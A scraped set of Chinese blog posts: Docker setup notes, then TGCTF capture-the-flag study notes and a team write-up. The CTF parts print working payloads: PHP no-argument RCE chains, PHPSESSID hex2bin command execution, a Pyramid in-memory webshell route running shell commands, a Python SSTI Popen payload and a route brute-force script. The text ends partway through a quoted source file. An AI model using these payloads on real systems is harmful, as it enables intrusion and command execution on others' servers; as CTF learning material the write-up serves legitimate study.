Docker 仓库 docker logout Docker 镜像设置\r由于一些原因，国内无法直连Docker官方仓库，原本的镜像站现在也都无法使用了，现在只剩一部分个人搭的镜像站可以使用，因此请经常检查自己的Docker镜像是否还能用\n目前国内可用Docker镜像源汇总（截至2025年3月）\n配置方式：\r临时使用：\r直接使用：\n直接用镜像域名拼接上官方镜像名。例如：要拉取 istio/distroless，可以这样写：\n1 docker pull docker-0.unsee.tech/istio/distroless 长久有效：\r以下命令在Debian 12.5,Ubuntu 16.04+适用\n修改文件 /etc/docker/daemon.json（如果不存在则需要创建创建，注意不要写入中文，要带 https://），并重启服务。\n1 2 # 创建目录 sudo mkdir -p /etc/docker 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 写入配置文件 sudo nano /etc/docker/daemon.json 或 sudo vi /etc/docker/daemon.json # 写入下面的\t{ \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://docker-0.unsee.tech\u0026#34;, \u0026#34;https://docker-cf.registry.cyou\u0026#34;, \u0026#34;https://docker.1panel.live\u0026#34; ] } # 重启docker服务 sudo systemctl daemon-reload \u0026amp;\u0026amp; sudo systemctl restart docker 使用docker pull 拉取镜像进行测试\nDocker file\r什么是 Dockerfile？\rDockerfile 是一个文本文件，包含了构建 Docker 镜像的所有指令。\nDockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。\n通过定义一系列命令和参数，Dockerfile 指导 Docker 构建一个自定义的镜像。\n例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 FROM golang:1.18-alpine AS builder COPY . /app RUN mkdir /out WORKDIR /app RUN go env -w GO111MODULE=on \\ \u0026amp;\u0026amp; go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct \\ \u0026amp;\u0026amp; CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /out/main . RUN cp -r /app/assets /app/views -t /out FROM centos:7 COPY --from=builder /out /app RUN chmod +x /usr/bin/curl \\ \u0026amp;\u0026amp; rm -rf /etc/yum.repos.d/*.repo \\ \u0026amp;\u0026amp; curl -k -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo \\ \u0026amp;\u0026amp; yum --exclude=kernel* update -y \\ \u0026amp;\u0026amp; yum install -y epel-release \\ \u0026amp;\u0026amp; rm -rf /etc/yum.repos.d/epel.repo \\ \u0026amp;\u0026amp; curl -k -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo \\ \u0026amp;\u0026amp; yum groupinstall -y \u0026#34;Development Tools\u0026#34; \\ \u0026amp;\u0026amp; yum install -y gcc openssl-devel bzip2-devel libffi-devel zlib-devel make wget \\ \u0026amp;\u0026amp; cd /usr/src \\ \u0026amp;\u0026amp; curl -k -o Python-3.10.4.tgz https://mirrors.huaweicloud.com/python/3.10.4/Python-3.10.4.tgz \\ \u0026amp;\u0026amp; tar xzf Python-3.10.4.tgz \\ \u0026amp;\u0026amp; cd Python-3.10.4 \\ \u0026amp;\u0026amp; ./configure --enable-optimizations \\ \u0026amp;\u0026amp; make altinstall \\ \u0026amp;\u0026amp; rm -f /usr/src/Python-3.10.4.tgz \\ \u0026amp;\u0026amp; ln -s /usr/local/bin/python3.10 /usr/bin/python3 \\ \u0026amp;\u0026amp; yum clean all \\ \u0026amp;\u0026amp; mkdir -p /home/John \\ \u0026amp;\u0026amp; chmod -R 755 /home/John COPY shell/* /home/John/ COPY start.sh /app/start.sh RUN chmod +x /home/John/shell.py WORKDIR /app EXPOSE 8000 CMD [\u0026#34;/bin/bash\u0026#34;, \u0026#34;/app/start.sh\u0026#34;] 基础知识\r每个保留关键字（指令）都必须是大写字母 执行从上到下顺序执行 #表示注释 每一个指令都会创建提交一个新的镜像层 Dockerfile：是定义了构建镜像文件的源代码，能够构建镜像文件 Docker Images：通过DockerFile构建生成的镜像，最终发布和运行的产品 Docker Container：容器就是镜像运行起来提供服务的 Dockerfile的指令\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #指定基础镜像，一切从这里构建 FROM #镜像是谁写的，姓名+邮箱 MAINTAINER #镜像构建运行时需要运行的命令 RUN #添加的内容 ADD #指定镜像的工作目录 WORKDIR #指定挂载的容器卷 VOLUME #指定暴露的端口 EXPOSE #指定容器启动时要运行的命令，只有最后一个会生效，可被替代 CMD #指定容器启动时要运行的命令，可以追加命令 ENTRYPOINT #当构建一个被继承的DockerFile，这个时候就会运行ONBUILD指令 ONBUILD #类似ADD，将文件拷贝进镜像中 COPY #构建的时候设置环境变量 ENV Docker Compose\rCompose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。\n注意：安装docker的同时，已经安装了Docker compose V2，无需再另外安装 Docker compose V1 ；Docker compose V2的命令以docker compose开头，如docker compose up\nDocker-compose.yml\rDockerfile让容器在任何地方运行，但如果要运行多个容器就十分麻烦，这就需要使用docker-compose.yml文件。\n例如：\n1 2 3 4 5 6 7 8 9 10 11 12 version: \u0026#39;3.8\u0026#39; services: app: build: context: . dockerfile: Dockerfile ports: - \u0026#34;8000:8000\u0026#34; # 可在此处修改映射到宿主机的端口 environment: FLAG: \u0026#34;ISCC{cl1mb3d_p3ngl41_sh4d0w}\u0026#34; # 可在此处动态修改FLAG值 command: [\u0026#34;/home/John/.bashrc\u0026#34;, \u0026#34;/app/start.sh\u0026#34;] 两个概念\nservices（服务）：容器、应用（mysql、nginx…） project（项目）：一组关联的容器 Docker compose常用命令\r1 2 3 4 5 6 7 8 9 10 11 12 13 up\t启动容器，终端运行 images\t列出镜像 down\t停止和删除容器、网络、卷、镜像 start\t启动项目中容器，后台运行 logs\t查看项目中容器日志 stop\t停止项目中容器 restart\t重启项目中容器 ps 查看启动的容器 #选项如下 -f file 指定Compose模板文件，默认为docker-compose.yml，可以多次指定 -p project 指定项目名称，默认将使用所在目录名称作为项目名 -d\t后台运行容器 requirements.txt\r有时候可能会遇见使用requirements.txt来存储依赖的情况，这个不必多言（）\nPython项目依赖，生成requirements.txt 有两种方法\n1、进入需要生成文件的目录，执行\n1 pip freeze \u0026gt; requirements.txt ，此方法会包含环境所有的依赖包。\n直接使用此命令，会把当前共用python环境的所有包都写进去，这些不必要的。可以在目标目录下面先pipenv shell，进入pipenv环境，再用上面的命令，产生的requirements.txt 就只包含虚拟环境的依赖项。\n2、pip install pipreqs\n进入需要生成文件的目录执行： pipreqs ./ (或者直接 pipreqs D:\\test(实际路径））\n在此时可能会遇见\nUnicodeDecodeError: ‘gbk’ codec can’t decode byte 0x80 in position 776: illegal multibyte sequence\n这个错误.\n解决方法：指定编码格式 pipreqs ./ \u0026ndash;encoding=utf8\n如果要安装requirements.txt中的类库内容，那么你可以执行:\n1 pip install -r requirements.txt 在dockerfile里就是\n1 RUN pipe install -r requirements.txt 参考：\nDocker学习笔记——DockerFile\nDocker学习笔记——Docker Compose\ndocker部署，生成依赖项清单requirements.txt\n","date":"2025-06-01T12:28:46+08:00","image":"https://miro.medium.com/v2/resize:fit:1100/format:webp/1*vQK4s0lOiK1ZkcXxFNIMDQ.png","permalink":"https://Oight.github.io/p/docker%E5%AD%A6%E4%B9%A0/","title":"Docker学习"},{"content":"Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\n1 2 3 4 5 6 php \u0026lt;?php if(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z,_]+((?R)?)/\u0026#39;, NULL, $_GET[\u0026#39;exp\u0026#39;]){ eval($_GET[\u0026#39;exp\u0026#39;]); } ?\u0026gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n无参RCE本质是程序中错误地使用了命令执行函数如 eval() 且采用了存在绕过隐患的黑名单匹配用户输入，考察的点是对PHP中函数特性的利用\n下面整理一些可以被利用的函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换） localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大） current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西 getcwd() :取得当前工作目录 dirname():函数返回路径中的目录部分 array_flip() :交换数组中的键和值，成功时返回交换后的数组 array_rand() :从数组中随机取出一个或多个单元 array_reverse():将数组内容反转 strrev():用于反转给定字符串 getcwd()：获取当前工作目录路径 dirname() ：函数返回路径中的目录部分。 chdir() ：函数改变当前的目录。 eval()、assert()：命令执行 hightlight_file()、show_source()、readfile()：读取文件内容 比如：\nscandir(‘.’) 可以返回当前目录，但是正则匹配了我们的参数，导致我们无法传参。所以我们需要想办法构造一个” . “ ，这时候我们就可以利用 localeconv() ,因为它返回的第一个元素就是 “ . “ ( 关于为什么 localeconv() 返回的第一个元素是 . 可以看这里：PHP localeconv() 函数 )\n这时候我们就可以得到一个查看当前目录文件的Payload：\n?参数=var_dump(scandir(current(localeconv())));\n这里 current() 的作用是把 localeconv() 返回的点取出 （原理看这里：PHP current() 函数 ）\n根据flag文件的位置不同，我们可以搭配 next() 或 prev() 和 array_reverse() 一起使用\n比如：\n我们使用 ?参数=var_dump(scandir(current(localeconv()))); 看到当前目录是这样的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 php array(3) { [0]=\u0026gt; string(1) \u0026#34;.\u0026#34; [1]=\u0026gt; string(2) \u0026#34;..\u0026#34; [2]=\u0026gt; string(3) \u0026#34;.git\u0026#34; [3]=\u0026gt; string(4) \u0026#34;flag.php\u0026#34; [4]=\u0026gt; string(5) \u0026#34;index.php\u0026#34; } 我们看到 flag.php 在倒数第二个，比较靠后的位置，这时候我们就可以用 array_reverse() 将数组内容反转，让它从倒数第二变成正数第二：\n1 2 3 4 5 6 7 8 9 10 11 12 13 php array(3) { [0]=\u0026gt; string(5) \u0026#34;index.php\u0026#34; [1]=\u0026gt; string(4) \u0026#34;flag.php\u0026#34; [2]=\u0026gt; string(3) \u0026#34;.git\u0026#34; [3]=\u0026gt; string(2) \u0026#34;..\u0026#34; [4]=\u0026gt; string(1) \u0026#34;.\u0026#34; } 然后我们就可以使用 next() 使内部指针指向第二个元素（即flag.php）并将其输出，最后我们可以用 highlight_file() 返回文件内容\n相关的方法：\n1 2 3 4 5 end() - 将内部指针指向数组中的最后一个元素，并输出。 next() - 将内部指针指向数组中的下一个元素，并输出。 prev() - 将内部指针指向数组中的上一个元素，并输出。 reset() - 将内部指针指向数组中的第一个元素，并输出。 each() - 返回当前元素的键名和键值，并将内部指针向前移动。 常见Payload：\n1 2 3 4 5 6 7 highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件 print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件 print_r(scandir(next(scandir(getcwd())))); //查看上一级目录的文件 show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件 show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件 show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件 show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位 以上是如何读取flag ，接下来我们来看看如何命令执行：\n使用session_id() 来RCE的也算在这里面，但这个我们单拎出来放后面\ngetallheaders()\rgetallheaders()返回当前请求的所有请求头信息，局限于Apache（ apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache ）\n当我们确定服务器使用Apache时，我们可以尝试使用 getallheaders() 函数来查看请求头信息，如果成功回显，我们就可以在请求头最后写入恶意代码，然后利用end() 来执行\n例如：我们写入 phpinfo();\nvar_dump(end(getallheaders()));\nend()指向最后一行的代码，达到phpinfo的目的，然后可以进一步去rce。\nget_defined_vars()\rget_defined_vars() 函数返回由所有已定义变量所组成的数组。它可以回显全局变量 $_GET、$_POST、$_FILES、$_COOKIE，\n返回数组顺序为$_GET--\u0026gt;$_POST--\u0026gt;$_COOKIE--\u0026gt;$_FILES\n同样首先确认是否有回显：\nprint_r(get_defined_vars());\n我们可以在后面拼接一个恶意代码：\na=eval(end(current(get_defined_vars())));\u0026amp;b=system(‘ls /‘); // a是原有的参数 //把eval换成assert也行 ，能执行system(‘ls /‘)就行\n执行逻辑：\n1. 参数传递\r用户发送的 GET 请求参数：\n1 2 plaintext a=eval(end(current(get_defined_vars())));\u0026amp;b=system(\u0026#39;ls /\u0026#39;); 参数 a 的值为字符串 eval(end(current(get_defined_vars())))。 参数 b 的值为字符串 system('ls /')。 2. 执行 eval($_GET['a'])\rPHP 脚本调用 eval($_GET['a'])，将参数 a 的值作为 PHP 代码执行：\n1 2 php eval(\u0026#34;eval(end(current(get_defined_vars())));\u0026#34;); 3. 内层 eval 的执行流程\r拆解内层 eval 的参数 end(current(get_defined_vars()))：\n步骤 3.1：get_defined_vars() 返回当前作用域的所有已定义变量（包括超全局变量 $_GET、$_SERVER 等）。 返回的数组结构类似：\n1 2 3 4 5 6 7 8 9 php array( \u0026#39;_GET\u0026#39; =\u0026gt; array( \u0026#39;a\u0026#39; =\u0026gt; \u0026#39;eval(end(current(get_defined_vars())))\u0026#39;, \u0026#39;b\u0026#39; =\u0026gt; \u0026#39;system(\\\u0026#39;ls /\\\u0026#39;)\u0026#39; ), // 其他变量如 $_SERVER、$_POST 等 // 脚本中可能定义的其他变量 ); 步骤 3.2：current(get_defined_vars()) 取 get_defined_vars() 返回数组的第一个元素的值。假设第一个元素是 $_GET，则返回 $_GET 数组：\n1 2 php array(\u0026#39;a\u0026#39; =\u0026gt; \u0026#39;...\u0026#39;, \u0026#39;b\u0026#39; =\u0026gt; \u0026#39;...\u0026#39;); 步骤 3.3：end(current(get_defined_vars())) 将 $_GET 数组的内部指针移动到最后一个元素，并返回该元素的值。假设参数 b 是最后一个元素，则返回 system('ls /')。\n步骤 3.4：外层 eval 执行结果 最终执行 eval(\u0026quot;system('ls /')\u0026quot;)，即调用 system('ls /')，执行 Linux 命令 ls /，列出根目录内容。\nPHPSESSID绕过\r当请求头中有cookie时，（ 或者走投无路时，我们可以尝试添加cookie ）这时候我们就可以考虑使用PHPSESSID绕过\nhex2bin（）\rhex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。所以我们可以将恶意代码转换成十六进制，然后在写入cookie中，从而达到执行命令的目的\n例：\nphpinfo();的十六进制编码，即706870696e666f28293b\n传入Payload:\n?参数=eval(hex2bin(session_id(session_start())));\n然后在cookie中写入：\ncookie: PHPSESSID=706870696e666f28293b\nTGCTF中的预期解就是这样：\n1 2 3 ?tgctf2025=session_start();system(hex2bin(session_id())); PHPSESSID=636174202f666c6167 cat /flag的十六进制 参考：\n无参数RCE绕过的详细总结（六种方法） 深入浅出带你学习无参RCE php 命令执行中 PHPSESSID 妙用\n内存马，pyramid 框架内存马\r内存马\r这个后面另外详细写一篇进行整理\npyramid 框架内存马\r这道题中我们注意到：\n1 2 3 4 5 6 python def checkExpr(expr_input): expr = re.split(r\u0026#34;[-+]\u0026#34;, expr_input) print(exec(expr_input)) # 致命漏洞：未过滤直接执行用户输入！ if len(expr) != 2: return 0 这一部分完全没有过滤用户输入，所以我们可以很轻松地传递 expr 来写入内存马\n我们这样注入：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 python expr=exec(\u0026#34; # 获取当前配置器（确保作用域正确） from pyramid.threadlocal import get_current_registry registry = get_current_registry() config = registry.settings[\u0026#39;pyramid.configurator\u0026#39;] # 添加路由和视图 config.add_route(\u0026#39;shell\u0026#39;, \u0026#39;/shell\u0026#39;) config.add_view( lambda req: Response(__import__(\u0026#39;os\u0026#39;).popen(req.params.get(\u0026#39;cmd\u0026#39;)).read()), route_name=\u0026#39;shell\u0026#39; ) config.commit() # 关键！提交配置变更 \u0026#34;)#+1 后面访问 shell 路由来RCE就行\n这道题中的内存马比较好写，完全没有过滤，Pyramid又允许在运行时动态修改路由配置，所以我们直接往进加后门路由就好了\nSSTI，类继承利用\rPayload:\n1 2 3 4 5 6 python ( [].__class__.__mro__[1].__subclasses__()[351]( \u0026#39;cat flag\u0026#39;, shell=True, stdout=-1 ).communicate()[0].strip() ) 用AI解释一下：\n这个代码片段是一个典型的 Python SSTI（Server-Side Template Injection）攻击 Payload，通过滥用 Python 的反射和继承机制来执行任意系统命令。以下是其详细解释和工作原理分析：\n代码结构拆解\n1 2 3 4 5 6 python ( [].__class__.__mro__[1].__subclasses__()[351]( \u0026#39;cat flag\u0026#39;, shell=True, stdout=-1 ).communicate()[0].strip() ) 逐层解析\n[]（空列表） 创建一个空列表对象，作为后续操作的起点。 .__class__ 获取列表对象的类（即\n1 list 类）：\n1 2 python list_class = [].__class__ # 等价于 list .__mro__ 1 __mro__ 是一个元组，表示类的\n方法解析顺序\n（Method Resolution Order）。对于\n1 list 类，其继承链为：\n1 2 plaintext list → object 因此：\n1 2 python mro_tuple = list_class.__mro__ # 输出：(list, object) [1]（取第二个元素） 取\n1 __mro__ 的第二个元素（即\n1 object 类）：\n1 2 python object_class = mro_tuple[1] # 等价于 object .__subclasses__() 1 object 类的\n1 __subclasses__() 方法返回\n所有直接子类的列表\n。这些子类包括 Python 内置的许多类，例如：\ntype（元类）\nint, str, list, dict 等基本类型\nsubprocess.Popen（关键点！）\n其他系统级类\n1 2 python subclasses = object_class.__subclasses__() [351]（索引 351） 通过索引\n1 351 定位到\n1 subprocess.Popen 类：\n1 2 python Popen_class = subclasses[351] 关键点：索引 351 是根据特定 Python 版本和环境确定的。例如，在 Python 3.8 中，subprocess.Popen 的索引可能为 351，但不同版本或环境可能不同。 调用 Popen 构造函数 使用\n1 Popen 类创建进程对象，执行命令：\n1 2 python process = Popen_class(\u0026#39;cat flag\u0026#39;, shell=True, stdout=-1) 'cat flag'：要执行的系统命令。 shell=True：允许通过 shell 执行命令（危险！）。 stdout=-1：等同于 stdout=subprocess.PIPE，捕获标准输出。 .communicate() 等待进程完成，并返回\n1 (stdout_data, stderr_data) 元组：\n1 2 python output_tuple = process.communicate() [0].strip() 获取标准输出（\n1 stdout_data ）并去除首尾空白字符：\n1 2 python result = output_tuple[0].strip() ","date":"2025-06-01T10:32:07+08:00","permalink":"https://Oight.github.io/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/","title":"TGCTF知识梳理"},{"content":"这次是和徐师傅，顾师傅，梁师傅一起打的，各方向都写在一起了，距离五十名只差一步之遥，还是我技术不够精湛的原因\nWeb\r这次TGCTF Web方面给了我很大的挫败感，感觉对很多知识的了解都非常浅薄，一直做不出题，还是要下苦功夫精进技术\n火眼辩魑魅\r这道题很简单的签到题，dirsearch 扫一下得到几个文件路径，真正能打通的是 shell.php ，直接蚁剑连接，在根目录下找到 flag\nAAA偷渡阴平\r无参RCE\n可以看看这篇\n无参数RCE绕过的详细总结(六种方法)\n直面天命\r这道题很好玩\n一开始看出来是 SSTI ，但是拼尽全力无法注入。\nF12看网页源码，提示不止一个路由，进 /hint 看看\n提示有四个字母的路由，写个脚本爆破一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 python # 路由爆破脚本 import sys import requests import argparse from concurrent.futures import ThreadPoolExecutor, as_completed from itertools import product def generate_four_letter_paths(): \u0026#34;\u0026#34;\u0026#34;生成所有四个小写字母的组合（如 aaaa, aaab, ..., zzzz）\u0026#34;\u0026#34;\u0026#34; letters = \u0026#39;abcdefghijklmnopqrstuvwxyz\u0026#39; for chars in product(letters, repeat=4): yield \u0026#39;\u0026#39;.join(chars) def check_url(base_url, path, results): full_url = f\u0026#34;{base_url}/{path}\u0026#34; try: response = requests.get( full_url, timeout=3, headers={\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0\u0026#39;}, allow_redirects=False # 避免重定向干扰状态码判断 ) if response.status_code == 200: results.append(full_url) print(f\u0026#34;[+] {full_url} - {response.status_code}\u0026#34;) except requests.exceptions.RequestException as e: pass # 忽略超时、连接错误等异常 def main(): parser = argparse.ArgumentParser(description=\u0026#39;四字母路径爆破工具\u0026#39;) parser.add_argument(\u0026#39;target\u0026#39;, help=\u0026#39;目标URL（如 http://example.com）\u0026#39;) parser.add_argument(\u0026#39;-t\u0026#39;, \u0026#39;--threads\u0026#39;, type=int, default=50, help=\u0026#39;线程数（默认50）\u0026#39;) parser.add_argument(\u0026#39;-o\u0026#39;, \u0026#39;--output\u0026#39;, help=\u0026#39;输出结果文件\u0026#39;) args = parser.parse_args() base_url = args.target.rstrip(\u0026#39;/\u0026#39;) results = [] # 生成所有四个小写字母的组合 paths = generate_four_letter_paths() with ThreadPoolExecutor(max_workers=args.threads) as executor: futures = [] for path in paths: futures.append(executor.submit(check_url, base_url, path, results)) # 实时更新进度（可选） total = 26 ** 4 # 总共有26^4=456,976种组合 completed = 0 for _ in as_completed(futures): completed += 1 if completed % 1000 == 0: print(f\u0026#34;进度：{completed}/{total}\u0026#34;, end=\u0026#39;\\r\u0026#39;) print(\u0026#34;\\n爆破完成！找到以下有效路径：\u0026#34;) for url in results: print(url) if args.output: with open(args.output, \u0026#39;w\u0026#39;) as f: for url in results: f.write(f\u0026#34;{url}\\n\u0026#34;) print(f\u0026#34;结果已保存到 {args.output}\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#34;警告：请确保您已获得目标网站的合法授权！\u0026#34;) main() 爆破出 /aazz 路由，进去 F12 看看，说是可以传参看源码(又要爆吗 QAQ )，后面问出题人说可以传 filename ，\n然后GET传 filename=../app.py 看看源码（提示看源码）\n源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 python import os import string from flask import Flask, request, render_template_string, jsonify, send_from_directory from a.b.c.d.secret import secret_key # 潜在风险：secret_key可能暴露在源码中 app = Flask(__name__) # 安全风险：黑名单不完整，可能被绕过 black_list = [\u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;popen\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;import\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;read\u0026#39;, \u0026#39;base\u0026#39;, \u0026#39;globals\u0026#39;] def waf(name): \u0026#34;\u0026#34;\u0026#34;基础WAF过滤\u0026#34;\u0026#34;\u0026#34; for x in black_list: if x in name.lower(): return True return False def is_typable(char): \u0026#34;\u0026#34;\u0026#34;检查字符是否可打印\u0026#34;\u0026#34;\u0026#34; typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars @app.route(\u0026#39;/\u0026#39;) def home(): \u0026#34;\u0026#34;\u0026#34;首页路由\u0026#34;\u0026#34;\u0026#34; return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def greet(): \u0026#34;\u0026#34;\u0026#34;核心处理路由（存在严重漏洞）\u0026#34;\u0026#34;\u0026#34; template1 = \u0026#34;\u0026#34; template2 = \u0026#34;\u0026#34; name = request.form.get(\u0026#39;name\u0026#39;) template = f\u0026#39;{name}\u0026#39; # WAF过滤 if waf(name): template = \u0026#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹\\nImage\u0026#39; else: # 检查字符是否可打印 k = 0 for i in name: if not is_typable(i): k = 1 break if k == 1: # 检查是否包含secret_key前缀（逻辑缺陷） if not (secret_key[:2] in name and secret_key[2:]): return render_template_string(\u0026#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧\\n\\n再去西行历练历练\\nImage\u0026#39;) # 模板注入漏洞：替换为{{}}语法 template1 = \u0026#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”\\n最后，如果你用了cat，就可以见到齐天大圣了\\n\u0026#34; template = template.replace(\u0026#34;直面\u0026#34;, \u0026#34;{{\u0026#34;).replace(\u0026#34;天命\u0026#34;, \u0026#34;}}\u0026#34;) # 检查cat关键词 if \u0026#34;cat\u0026#34; in template: template2 = \u0026#39;\\n或许你这只叫天命人的猴子，真的能做到？\\nImage\u0026#39; # 渲染模板（存在注入风险） try: return template1 + render_template_string(template) + render_template_string(template2) except Exception as e: return f\u0026#34;500报错了，查询语句如下：\\n{template}\u0026#34;, 400 @app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def hinter(): \u0026#34;\u0026#34;\u0026#34;提示路由\u0026#34;\u0026#34;\u0026#34; return render_template_string(\u0026#34;hint：\\n有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!\u0026#34;) @app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def finder(): \u0026#34;\u0026#34;\u0026#34;文件读取路由（存在路径遍历漏洞）\u0026#34;\u0026#34;\u0026#34; filename = request.args.get(\u0026#39;filename\u0026#39;, \u0026#39;\u0026#39;) # 初始处理 if not filename: return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;file.html\u0026#39;) # 文件名检查（逻辑错误：原代码存在语法问题） if not filename.replace(\u0026#39;_\u0026#39;, \u0026#39;\u0026#39;).isalnum(): return jsonify({\u0026#39;error\u0026#39;: \u0026#39;只允许字母和数字！\u0026#39;}), 400 # 路径遍历漏洞：直接使用用户输入的filename if os.path.isfile(filename): try: with open(filename, \u0026#39;r\u0026#39;) as file: content = file.read() return content except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 else: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;路径不存在或者路径非法\u0026#39;}), 404 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) 这道题本来是考SSTI的，但怎么都绕不过防火墙，但有非预期解\n我们知道 /aazz 目录下可以传参读取文件的\n我们直接读flag：\nPayload: http://node1.tgctf.woooo.tech:30904/aazz?filename=flag\n读到flag\n直面天命（复仇）\r这道题我没做出来，把源码放在这方便后面复现\n复仇直接ban了传参读文件功能，直接回显源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 python import os import string from flask import Flask, request, render_template_string, jsonify, send_from_directory from a.b.c.d.secret import secret_key app = Flask(__name__) black_list=[\u0026#39;lipsum\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;map\u0026#39;,\u0026#39;chr\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;get\u0026#39;, \u0026#34;url\u0026#34;, \u0026#39;pop\u0026#39;,\u0026#39;include\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;base\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;_.\u0026#39;,\u0026#39;set\u0026#39;,\u0026#39;application\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;request\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;arg\u0026#39;, \u0026#39;config\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;self\u0026#39;] def waf(name): for x in black_list: if x in name.lower(): return True return False def is_typable(char): # 定义可通过标准 QWERTY 键盘输入的字符集 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars @app.route(\u0026#39;/\u0026#39;) def home(): return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def greet(): template1=\u0026#34;\u0026#34; template2=\u0026#34;\u0026#34; name = request.form.get(\u0026#39;name\u0026#39;) template = f\u0026#39;{name}\u0026#39; if waf(name): template = \u0026#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹 Image\u0026#39; else: k=0 for i in name: if is_typable(i): continue k=1 break if k==1: if not (secret_key[:2] in name and secret_key[2:]): template = \u0026#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧 再去西行历练历练 Image\u0026#39; return render_template_string(template) template1 = 